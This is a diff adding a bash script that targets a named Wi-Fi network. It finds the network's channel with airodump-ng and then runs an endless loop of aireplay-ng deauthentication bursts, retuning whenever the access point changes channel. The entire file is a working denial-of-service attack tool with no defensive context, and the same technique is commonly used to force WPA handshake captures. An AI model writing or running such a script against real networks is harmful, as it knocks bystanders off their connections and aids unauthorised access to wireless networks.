@@ -1,0 +1,65 @@
+#!/bin/bash
+ESSID=$1
+INTF=wlan0
+
+if [[ "$ESSID" == "" ]]; then
+echo "Usage: $0 ESSID"
+ESSID=$1
+exit 0
+fi
+
+TAIL_PID=
+
+get_channel() {
+	rm -f dump
+	stdbuf -oL airodump-ng --essid $ESSID -U $INTF > dump 2>&1 &
+	PID=$!
+	sleep 10
+	kill $PID
+	fgrep WPA2 dump | tail -1 | awk '{print $6}'
+}
+term() {
+    #rm -f output
+    kill $TAIL_PID
+}
+
+trap "term;exit" SIGINT SIGTERM
+
+
+echo "Scanning $ESSID for AP channel"
+read CHANNEL <<< $(get_channel)
+echo "Target channel has changed to $CHANNEL, resetting current wifi channel"
+
+if [[ "$CHANNEL" -ne "" ]]; then
+	iwconfig $INTF channel $CHANNEL
+fi
+while true ;do 
+	echo > output
+	stdbuf -o0 aireplay-ng --deauth 10 -e $ESSID $INTF >output 2>&1 &
+	AIREPLAY_PID=$!
+	tail -f output &
+	TAIL_PID=$!
+	wait $AIREPLAY_PID
+	kill -9 $TAIL_PID
+	CHANNEL=`grep 'but the AP uses channel' output | sed 's/.* \([0-9]\+\)$/\1/'`
+	if [[ "$CHANNEL" -ne "" ]]; then
+		echo "Target channel has changed to $CHANNEL, resetting current wifi channel"
+		iwconfig $INTF channel $CHANNEL
+		sleep 60
+		#airmon-ng start wlan0 $CHANNEL
+	fi
+	ERROR=`cat output | grep 'No such'|wc -l`
+	echo "Error = $ERROR"
+	if [[ "$ERROR" -ne "0" ]]; then
+		echo "Cannot find ESSID $ESSID, try to dump WiFi to find right channel"
+		read CHANNEL <<< $(get_channel)
+		if [[ "$CHANNEL" -eq "" ]]; then
+			echo "$ESSID is offline"
+		else
+			echo "Target channel has changed to $CHANNEL, resetting current wifi channel"
+			iwconfig $INTF channel $CHANNEL
+		fi
+	fi
+	sleep 1
+done
+
